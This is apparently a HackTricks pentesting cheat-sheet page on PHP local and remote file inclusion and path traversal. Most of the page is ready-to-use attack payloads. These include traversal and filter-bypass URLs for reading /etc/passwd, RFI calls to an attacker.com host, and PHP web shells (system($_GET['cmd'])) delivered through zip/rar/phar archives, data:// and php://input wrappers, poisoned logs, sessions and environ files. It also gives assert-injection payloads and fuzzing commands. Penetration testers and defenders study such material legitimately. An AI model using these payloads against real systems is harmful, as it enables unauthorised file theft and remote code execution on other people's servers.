# File Inclusion/Path traversal

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Share your hacking tricks by submitting PRs to the** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **and** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).

</details>

<figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>

**HackenProof is home to all crypto bug bounties.**

**Get rewarded without delays**\
HackenProof bounties launch only when their customers deposit the reward budget. You'll get the reward after the bug is verified.

**Get experience in web3 pentesting**\
Blockchain protocols and smart contracts are the new Internet! Master web3 security at its rising days.

**Become the web3 hacker legend**\
Gain reputation points with each verified bug and conquer the top of the weekly leaderboard.

[**Sign up on HackenProof**](https://hackenproof.com/register) start earning from your hacks!

{% embed url="https://hackenproof.com/register" %}

## File Inclusion

**Remote File Inclusion (RFI):** The file is loaded from a remote server (Best: You can write the code and the server will execute it). In php this is **disabled** by default (**allow\_url\_include**).\
**Local File Inclusion (LFI):** The sever loads a local file.

The vulnerability occurs when the user can control in some way the file that is going to be load by the server.

Vulnerable **PHP functions**: require, require\_once, include, include\_once

A interesting tool to exploit this vulnerability: [https://github.com/kurobeats/fimap](https://github.com/kurobeats/fimap)

## Blind - Interesting - LFI2RCE files

```python
wfuzz -c -w ./lfi2.txt --hw 0 http://10.10.10.10/nav.php?page=../../../../../../../FUZZ
```

### **Linux**

**Mixing several \*nix LFI lists and adding more paths I have created this one:**

{% embed url="https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_linux.txt" %}

Try also to change `/` for `\`\
Try also to add `../../../../../`

A list that uses several techniques to find the file /etc/password (to check if the vulnerability exists) can be found [here](https://github.com/xmendez/wfuzz/blob/master/wordlist/vulns/dirTraversal-nix.txt)

### **Windows**

Merging several lists I have created:

{% embed url="https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_windows.txt" %}

Try also to change `/` for `\`\
Try also to remove `C:/` and add `../../../../../`

A list that uses several techniques to find the file /boot.ini (to check if the vulnerability exists) can be found [here](https://github.com/xmendez/wfuzz/blob/master/wordlist/vulns/dirTraversal-win.txt)

### **OS X**

Check the LFI list of linux.

## Basic LFI and bypasses

All the examples are for Local File Inclusion but could be applied to Remote File Inclusion also (page=[http://myserver.com/phpshellcode.txt\\](http://myserver.com/phpshellcode.txt\)/).

```
http://example.com/index.php?page=../../../etc/passwd
```

### traversal sequences stripped non-recursively

```python
http://example.com/index.php?page=....//....//....//etc/passwd
http://example.com/index.php?page=....\/....\/....\/etc/passwd
http://some.domain.com/static/%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/etc/passwd
```

### **Null byte (%00)**

Bypass the append more chars at the end of the provided string (bypass of: $\_GET\['param']."php")

```
http://example.com/index.php?page=../../../etc/passwd%00
```

This is **solved since PHP 5.4**

### **Encoding**

You could use non-standard encondings like double URL encode (and others):

```
http://example.com/index.php?page=..%252f..%252f..%252fetc%252fpasswd
http://example.com/index.php?page=..%c0%af..%c0%af..%c0%afetc%c0%afpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd%00
```

### From existent folder

Maybe the back-end is checking the folder path:

```python
http://example.com/index.php?page=utils/scripts/../../../../../etc/passwd
```

### Identifying folders on a server

Depending on the applicative code / allowed characters, it might be possible to recursively explore the file system by discovering folders and not just files. In order to do so:

* identify the "depth" of you current directory by succesfully retrieving `/etc/passwd` (if on Linux):

```
http://example.com/index.php?page=../../../etc/passwd # depth of 3
```

* try and guess the name of a folder in the current directory by adding the folder name (here, `private`), and then going back to `/etc/passwd`:

```
http://example.com/index.php?page=private/../../../../etc/passwd # we went deeper down one level, so we have to go 3+1=4 levels up to go back to /etc/passwd 
```

* if the application is vulnerable, there might be two different outcomes to the request:
  * if you get an error / no output, the `private` folder does not exist at this location
  * if you get the content from `/etc/passwd`, you validated that there is indeed a `private`folder in your current directory
* the folder(s) you discovered using this techniques can then be fuzzed for files (using a classic LFI method) or for subdirectories using the same technique recursively.

It is possible to adapt this technique to find directories at any location in the file system. For instance, if, under the same hypothesis (current directory at depth 3 of the file system) you want to check if `/var/www/` contains a `private` directory, use the following payload:

```
http://example.com/index.php?page=../../../var/www/private/../../../etc/passwd
```

The following sequence of commands allows the generation of payloads using `sed` (1) as input for url fuzzing tools such as `ffuf` (2):

```
$ sed 's_^_../../../var/www/_g' /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt | sed 's_$_/../../../etc/passwd_g' > payloads.txt
$ ffuf -u http://example.com/index.php?page=FUZZ -w payloads.txt -mr "root"
```

Of course, adapt there payloads to your needs in terms of depth / location / input directory list.

### **Path truncation**

Bypass the append of more chars at the end of the provided string (bypass of: $\_GET\['param']."php")

```
In PHP: /etc/passwd = /etc//passwd = /etc/./passwd = /etc/passwd/ = /etc/passwd/.
Check if last 6 chars are passwd --> passwd/
Check if last 4 chars are ".php" --> shellcode.php/.
```

```
http://example.com/index.php?page=a/../../../../../../../../../etc/passwd..\.\.\.\.\.\.\.\.\.\.\[ADD MORE]\.\.
http://example.com/index.php?page=a/../../../../../../../../../etc/passwd/././.[ADD MORE]/././.

#With the next options, by trial and error, you have to discover how many "../" are needed to delete the appended string but not "/etc/passwd" (near 2027)

http://example.com/index.php?page=a/./.[ADD MORE]/etc/passwd
http://example.com/index.php?page=a/../../../../[ADD MORE]../../../../../etc/passwd
```

Always try to **start** the path **with a fake directory** (a/).

**This vulnerability was corrected in PHP 5.3.**

### **Filter bypass tricks**

```
http://example.com/index.php?page=....//....//etc/passwd
http://example.com/index.php?page=..///////..////..//////etc/passwd
http://example.com/index.php?page=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd
Maintain the initial path: http://example.com/index.php?page=/var/www/../../etc/passwd
http://example.com/index.php?page=PhP://filter
```

## Basic RFI

```python
http://example.com/index.php?page=http://atacker.com/mal.php
http://example.com/index.php?page=\\attacker.com\shared\mal.php
```

## Python Root element

In python in a code like this one:

```python
# file_name is controlled by a user
os.path.join(os.getcwd(), "public", file_name)
```

If the user passes an **absolute path** to **`file_name`**, the **previous path is just removed**:

```python
os.path.join(os.getcwd(), "public", "/etc/passwd")
'/etc/passwd'
```

It is the intended behaviour according to [the docs](https://docs.python.org/3.10/library/os.path.html#os.path.join):

> If a component is an absolute path, all previous components are thrown away and joining continues from the absolute path component.

## Java List Directories

It looks like if you have a Path Traversal in Java and you **ask for a directory** instead of a file, a **listing of the directory is returned**. This won't be happening in other languages (afaik).

## Top 25 parameters

Here’s list of top 25 parameters that could be vulnerable to local file inclusion (LFI) vulnerabilities (from [link](https://twitter.com/trbughunters/status/1279768631845494787)):

```
?cat={payload}
?dir={payload}
?action={payload}
?board={payload}
?date={payload}
?detail={payload}
?file={payload}
?download={payload}
?path={payload}
?folder={payload}
?prefix={payload}
?include={payload}
?page={payload}
?inc={payload}
?locate={payload}
?show={payload}
?doc={payload}
?site={payload}
?type={payload}
?view={payload}
?content={payload}
?document={payload}
?layout={payload}
?mod={payload}
?conf={payload}
```

## LFI / RFI using PHP wrappers & protocols

### php://filter

PHP filters allow perform basic **modification operations on the data** before being it's read or written. There are 5 categories of filters:

* [String Filters](https://www.php.net/manual/en/filters.string.php):
  * `string.rot13`
  * `string.toupper`
  * `string.tolower`
  * `string.strip_tags`: Remove tags from the data (everything between "<" and ">" chars)
    * Note that this filter has disappear from the modern versions of PHP
* [Conversion Filters](https://www.php.net/manual/en/filters.convert.php)
  * `convert.base64-encode`
  * `convert.base64-decode`
  * `convert.quoted-printable-encode`
  * `convert.quoted-printable-decode`
  * `convert.iconv.*` : Transforms to a different encoding(`convert.iconv.<input_enc>.<output_enc>`) . To get the **list of all the encodings** supported run in the console: `iconv -l`

{% hint style="warning" %}
Abusing the `convert.iconv.*` conversion filter you can **generate arbitrary text**, which could be useful to write arbitrary text or make a function like include process arbitrary text. For more info check [**LFI2RCE via php filters**](lfi2rce-via-php-filters.md).
{% endhint %}

* [Compression Filters](https://www.php.net/manual/en/filters.compression.php)
  * `zlib.deflate`: Compress the content (useful if exfiltrating a lot of info)
  * `zlib.inflate`: Decompress the data
* [Encryption Filters](https://www.php.net/manual/en/filters.encryption.php)
  * `mcrypt.*` : Deprecated
  * `mdecrypt.*` : Deprecated
* Other Filters
  * Running in php `var_dump(stream_get_filters());` you can find a couple of **unexpected filters**:
    * `consumed`
    * `dechunk`: reverses HTTP chunked encoding
    * `convert.*`

```php
# String Filters
## Chain string.toupper, string.rot13 and string.tolower reading /etc/passwd
echo file_get_contents("php://filter/read=string.toupper|string.rot13|string.tolower/resource=file:///etc/passwd");
## Same chain without the "|" char
echo file_get_contents("php://filter/string.toupper/string.rot13/string.tolower/resource=file:///etc/passwd");
## string.string_tags example
echo file_get_contents("php://filter/string.strip_tags/resource=data://text/plain,<b>Bold</b><?php php code; ?>lalalala");

# Conversion filter
## B64 decode
echo file_get_contents("php://filter/convert.base64-decode/resource=data://plain/text,aGVsbG8=");
## Chain B64 encode and decode
echo file_get_contents("php://filter/convert.base64-encode|convert.base64-decode/resource=file:///etc/passwd");
## convert.quoted-printable-encode example
echo file_get_contents("php://filter/convert.quoted-printable-encode/resource=data://plain/text,£hellooo=");
=C2=A3hellooo=3D
## convert.iconv.utf-8.utf-16le
echo file_get_contents("php://filter/convert.iconv.utf-8.utf-16le/resource=data://plain/text,trololohellooo=");

# Compresion Filter
## Compress + B64
echo file_get_contents("php://filter/zlib.deflate/convert.base64-encode/resource=file:///etc/passwd");
readfile('php://filter/zlib.inflate/resource=test.deflated'); #To decompress the data locally
# note that PHP protocol is case-inselective (that's mean you can use "PhP://" and any other varient)
```

{% hint style="warning" %}
The part "php://filter" is case insensitive
{% endhint %}

### php://fd

This wrapper allows to access file descriptors that the process has open. Potentially useful to exfiltrate the content of opened files:

```php
echo file_get_contents("php://fd/3");
$myfile = fopen("/etc/passwd", "r");
```

You can also use **php://stdin, php://stdout and php://stderr** to access the **file descriptors 0, 1 and 2** respectively (not sure how this could be useful in an attack)

### zip:// and rar://

Upload a Zip or Rar file with a PHPShell inside and access it.\
In order to be able to abuse the rar protocol it **need to be specifically activated**.

```bash
echo "<pre><?php system($_GET['cmd']); ?></pre>" > payload.php;  
zip payload.zip payload.php;
mv payload.zip shell.jpg;
rm payload.php

http://example.com/index.php?page=zip://shell.jpg%23payload.php

# To compress with rar
rar a payload.rar payload.php;
mv payload.rar shell.jpg;
rm payload.php
http://example.com/index.php?page=rar://shell.jpg%23payload.php
```

### data://

```
http://example.net/?page=data://text/plain,<?php echo base64_encode(file_get_contents("index.php")); ?>
http://example.net/?page=data://text/plain,<?php phpinfo(); ?>
http://example.net/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
http://example.net/?page=data:text/plain,<?php echo base64_encode(file_get_contents("index.php")); ?>
http://example.net/?page=data:text/plain,<?php phpinfo(); ?>
http://example.net/?page=data:text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
NOTE: the payload is "<?php system($_GET['cmd']);echo 'Shell done !'; ?>"
```

Fun fact: you can trigger an XSS and bypass the Chrome Auditor with : `http://example.com/index.php?page=data:application/x-httpd-php;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+`

Note that this protocol is restricted by php configurations **`allow_url_open`** and **`allow_url_include`**

### expect://

Expect has to be activated. You can execute code using this.

```
http://example.com/index.php?page=expect://id
http://example.com/index.php?page=expect://ls
```

### input://

Specify your payload in the POST parameters

```
http://example.com/index.php?page=php://input
POST DATA: <?php system('id'); ?>
```

### phar://

A `.phar` file can be also used to execute PHP code if the web is using some function like `include` to load the file.

{% code title="create_phar.php" %}
```python
<?php
$phar = new Phar('test.phar');
$phar->startBuffering();
$phar->addFromString('test.txt', 'text');
$phar->setStub('<?php __HALT_COMPILER(); system("ls"); ?>');

$phar->stopBuffering();
```
{% endcode %}

And you can compile the `phar` executing the following line:

```bash
php --define phar.readonly=0 create_path.php
```

A file called `test.phar` will be generated that you can use to abuse the LFI.

If the LFI is just reading the file and not executing the php code inside of it, for example using functions like _**file\_get\_contents(), fopen(), file() or file\_exists(), md5\_file(), filemtime() or filesize()**_**.** You can try to abuse a **deserialization** occurring when **reading** a **file** using the **phar** protocol.\
For more information read the following post:

{% content-ref url="phar-deserialization.md" %}
[phar-deserialization.md](phar-deserialization.md)
{% endcontent-ref %}

### More protocols

Check more possible[ **protocols to include here**](https://www.php.net/manual/en/wrappers.php)**:**

* [php://memory and php://temp](https://www.php.net/manual/en/wrappers.php.php#wrappers.php.memory) — Write in memory or in a temporary file (not sure how this can be useful in a file inclusion attack)
* [file://](https://www.php.net/manual/en/wrappers.file.php) — Accessing local filesystem
* [http://](https://www.php.net/manual/en/wrappers.http.php) — Accessing HTTP(s) URLs
* [ftp://](https://www.php.net/manual/en/wrappers.ftp.php) — Accessing FTP(s) URLs
* [zlib://](https://www.php.net/manual/en/wrappers.compression.php) — Compression Streams
* [glob://](https://www.php.net/manual/en/wrappers.glob.php) — Find pathnames matching pattern (It doesn't return nothing printable, so not really useful here)
* [ssh2://](https://www.php.net/manual/en/wrappers.ssh2.php) — Secure Shell 2
* [ogg://](https://www.php.net/manual/en/wrappers.audio.php) — Audio streams (Not useful to read arbitrary files)

## LFI via PHP's 'assert'

If you encounter a difficult LFI that appears to be filtering traversal strings such as ".." and responding with something along the lines of "Hacking attempt" or "Nice try!", an 'assert' injection payload may work.

A payload like this:

```
' and die(show_source('/etc/passwd')) or '
```

will successfully exploit PHP code for a "file" parameter that looks like this:

```bash
assert("strpos('$file', '..') === false") or die("Detected hacking attempt!");
```

It's also possible to get RCE in a vulnerable "assert" statement using the system() function:

```
' and die(system("whoami")) or '
```

Be sure to URL-encode payloads before you send them.

<figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>

**HackenProof is home to all crypto bug bounties.**

**Get rewarded without delays**\
HackenProof bounties launch only when their customers deposit the reward budget. You'll get the reward after the bug is verified.

**Get experience in web3 pentesting**\
Blockchain protocols and smart contracts are the new Internet! Master web3 security at its rising days.

**Become the web3 hacker legend**\
Gain reputation points with each verified bug and conquer the top of the weekly leaderboard.

[**Sign up on HackenProof**](https://hackenproof.com/register) start earning from your hacks!

{% embed url="https://hackenproof.com/register" %}

## PHP Blind Path Traversal

{% hint style="warning" %}
This technique is relevant in cases where you **control** the **file path** of a **PHP function** that will **access a file** but you won't see the content of the file (like a simple call to **`file()`**) but the content is not shown.
{% endhint %}

In [**this incredible post**](https://www.synacktiv.com/en/publications/php-filter-chains-file-read-from-error-based-oracle.html) it's explained how a blind path traversal can be abused via PHP filter to **exfiltrate the content of a file via an error oracle**.

As sumary, the technique is using the **"UCS-4LE" encoding** to make the content of a file so **big** that the **PHP function opening** the file will trigger an **error**.

Then, in order to leak the first char the filter **`dechunk`** is used along with other such as **base64** or **rot13** and finally the filters **convert.iconv.UCS-4.UCS-4LE** and **convert.iconv.UTF16.UTF-16BE** are used to **place other chars at the beggining and leak them**.

**Functions that might be vulnerable**: `file_get_contents`, `readfile`, `finfo->file`, `getimagesize`, `md5_file`, `sha1_file`, `hash_file`, `file`, `parse_ini_file`, `copy`, `file_put_contents (only target read only with this)`, `stream_get_contents`, `fgets`, `fread`, `fgetc`, `fgetcsv`, `fpassthru`, `fputs`

For the technical details check the mentioned post!

## LFI2RCE

### Basic RFI

```python
http://example.com/index.php?page=http://atacker.com/mal.php
http://example.com/index.php?page=\\attacker.com\shared\mal.php
```

### Via Apache/Nginx log file

If the Apache or Nginx server is **vulnerable to LFI** inside the include function you could try to access to **`/var/log/apache2/access.log` or `/var/log/nginx/access.log`**, set inside the **user agent** or inside a **GET parameter** a php shell like **`<?php system($_GET['c']); ?>`** and include that file

{% hint style="warning" %}
Note that **if you use double quotes** for the shell instead of **simple quotes**, the double quotes will be modified for the string "_**quote;**_", **PHP will throw an error** there and **nothing else will be executed**.

Also, make sure you **write correctly the payload** or PHP will error every time it tries to load the log file and you won't have a second opportunity.
{% endhint %}

This could also be done in other logs but b**e careful,** the code inside the logs could be URL encoded and this could destroy the Shell. The header **authorisation "basic"** contains "user:password" in Base64 and it is decoded inside the logs. The PHPShell could be inserted inside this header.\
Other possible log paths:

```python
/var/log/apache2/access.log
/var/log/apache/access.log
/var/log/apache2/error.log
/var/log/apache/error.log
/usr/local/apache/log/error_log
/usr/local/apache2/log/error_log
/var/log/nginx/access.log
/var/log/nginx/error.log
/var/log/httpd/error_log
```

Fuzzing wordlist: [https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI)

### Via Email

**Send a mail** to a internal account (user@localhost) containing your PHP payload like `<?php echo system($_REQUEST["cmd"]); ?>` and try to include to the mail of the user with a path like **`/var/mail/<USERNAME>`** or **`/var/spool/mail/<USERNAME>`**

### Via /proc/\*/fd/\*

1. Upload a lot of shells (for example : 100)
2. Include [http://example.com/index.php?page=/proc/$PID/fd/$FD](http://example.com/index.php?page=/proc/$PID/fd/$FD), with $PID = PID of the process (can be brute forced) and $FD the file descriptor (can be brute forced too)

### Via /proc/self/environ

Like a log file, send the payload in the User-Agent, it will be reflected inside the /proc/self/environ file

```
GET vulnerable.php?filename=../../../proc/self/environ HTTP/1.1
User-Agent: <?=phpinfo(); ?>
```

### Via upload

If you can upload a file, just inject the shell payload in it (e.g : `<?php system($_GET['c']); ?>` ).

```
http://example.com/index.php?page=path/to/uploaded/file.png
```

In order to keep the file readable it is best to inject into the metadata of the pictures/doc/pdf

### Via Zip fie upload

Upload a ZIP file containing a PHP shell compressed and access:

```python
example.com/page.php?file=zip://path/to/zip/hello.zip%23rce.php
```

### Via PHP sessions

Check if the website use PHP Session (PHPSESSID)

```
Set-Cookie: PHPSESSID=i56kgbsq9rm8ndg3qbarhsbm27; path=/
Set-Cookie: user=admin; expires=Mon, 13-Aug-2018 20:21:29 GMT; path=/; httponly
```

In PHP these sessions are stored into _/var/lib/php5/sess\\_\[PHPSESSID]\_ files

```
/var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm27.
user_ip|s:0:"";loggedin|s:0:"";lang|s:9:"en_us.php";win_lin|s:0:"";user|s:6:"admin";pass|s:6:"admin";
```

Set the cookie to `<?php system('cat /etc/passwd');?>`

```
login=1&user=<?php system("cat /etc/passwd");?>&pass=password&lang=en_us.php
```

Use the LFI to include the PHP session file

```
login=1&user=admin&pass=password&lang=/../../../../../../../../../var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm2
```

### Via ssh

If ssh is active check which user is being used (/proc/self/status & /etc/passwd) and try to access **\<HOME>/.ssh/id\_rsa**

### **Via** **vsftpd** _**logs**_

The logs of this FTP server are stored in _**/var/log/vsftpd.log.**_ If you have a LFI and can access a exposed vsftpd server, you could try to login setting the PHP payload in the username and then access the logs using the LFI.
### Via php base64 filter (using base64)
as shown in [this](https://matan-h.com/one-lfi-bypass-to-rule-them-all-using-base64) article,PHP base64 filter just ignore Non-base64.You can use that to bypass the file extension check: if you supply base64 that ends with ".php", and it would just ignore the "." and append "php" to the base64. 
Here is an example payload:
```url
http://example.com/index.php?page=PHP://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+.php

NOTE: the payload is "<?php system($_GET['cmd']);echo 'Shell done !'; ?>"
```
### Via php filters (no file needed)

This [**writeup** ](https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d)explains that you can use **php filters to generate arbitrary content** as output. Which basically means that you can **generate arbitrary php code** for the include **without needing to write** it into a file.

{% content-ref url="lfi2rce-via-php-filters.md" %}
[lfi2rce-via-php-filters.md](lfi2rce-via-php-filters.md)
{% endcontent-ref %}

### Via segmentation fault

**Upload** a file that will be stored as **temporary** in `/tmp`, then in the **same request,** trigger a **segmentation fault**, and then the **temporary file won't be deleted** and you can search for it.

{% content-ref url="lfi2rce-via-segmentation-fault.md" %}
[lfi2rce-via-segmentation-fault.md](lfi2rce-via-segmentation-fault.md)
{% endcontent-ref %}

### Via Nginx temp file storage

If you found a **Local File Inclusion** and **Nginx** is running in front of PHP you might be able to obtain RCE with the following technique:

{% content-ref url="lfi2rce-via-nginx-temp-files.md" %}
[lfi2rce-via-nginx-temp-files.md](lfi2rce-via-nginx-temp-files.md)
{% endcontent-ref %}

### Via PHP\_SESSION\_UPLOAD\_PROGRESS

If you found a **Local File Inclusion** even if you **don't have a session** and `session.auto_start` is `Off`. If you provide the **`PHP_SESSION_UPLOAD_PROGRESS`** in **multipart POST** data, PHP will **enable the session for you**. You could abuse this to get RCE:

{% content-ref url="via-php_session_upload_progress.md" %}
[via-php\_session\_upload\_progress.md](via-php\_session\_upload\_progress.md)
{% endcontent-ref %}

### Via temp file uploads in Windows

If you found a **Local File Inclusion** and and the server is running in **Windows** you might get RCE:

{% content-ref url="lfi2rce-via-temp-file-uploads.md" %}
[lfi2rce-via-temp-file-uploads.md](lfi2rce-via-temp-file-uploads.md)
{% endcontent-ref %}

### Via phpinfo() (file\_uploads = on)

If you found a **Local File Inclusion** and a file exposing **phpinfo()** with file\_uploads = on you can get RCE:

{% content-ref url="lfi2rce-via-phpinfo.md" %}
[lfi2rce-via-phpinfo.md](lfi2rce-via-phpinfo.md)
{% endcontent-ref %}

### Via compress.zlib + `PHP_STREAM_PREFER_STUDIO` + Path Disclosure

If you found a **Local File Inclusion** and you **can exfiltrate the path** of the temp file BUT the **server** is **checking** if the **file to be included has PHP marks**, you can try to **bypass that check** with this **Race Condition**:

{% content-ref url="lfi2rce-via-compress.zlib-+-php_stream_prefer_studio-+-path-disclosure.md" %}
[lfi2rce-via-compress.zlib-+-php\_stream\_prefer\_studio-+-path-disclosure.md](lfi2rce-via-compress.zlib-+-php\_stream\_prefer\_studio-+-path-disclosure.md)
{% endcontent-ref %}

### Via eternal waiting + bruteforce

If you can abuse the LFI to **upload temporary files** and make the server **hang** the PHP execution, you could then **brute force filenames during hours** to find the temporary file:

{% content-ref url="lfi2rce-via-eternal-waiting.md" %}
[lfi2rce-via-eternal-waiting.md](lfi2rce-via-eternal-waiting.md)
{% endcontent-ref %}

### To Fatal Error

If you include any of the files `/usr/bin/phar`, `/usr/bin/phar7`, `/usr/bin/phar.phar7`, `/usr/bin/phar.phar`. (You need to include the same one 2 time to throw that error).

**I don't know how is this useful but it might be.**\
_Even if you cause a PHP Fatal Error, PHP temporary files uploaded are deleted._

<figure><img src="../../.gitbook/assets/image (1) (5).png" alt=""><figcaption></figcaption></figure>

## References

[PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal)\
[PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal/Intruders](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal/Intruders)

{% file src="../../.gitbook/assets/EN-Local-File-Inclusion-1.pdf" %}

<figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>

**HackenProof is home to all crypto bug bounties.**

**Get rewarded without delays**\
HackenProof bounties launch only when their customers deposit the reward budget. You'll get the reward after the bug is verified.

**Get experience in web3 pentesting**\
Blockchain protocols and smart contracts are the new Internet! Master web3 security at its rising days.

**Become the web3 hacker legend**\
Gain reputation points with each verified bug and conquer the top of the weekly leaderboard.

[**Sign up on HackenProof**](https://hackenproof.com/register) start earning from your hacks!

{% embed url="https://hackenproof.com/register" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Share your hacking tricks by submitting PRs to the** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **and** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).

</details>
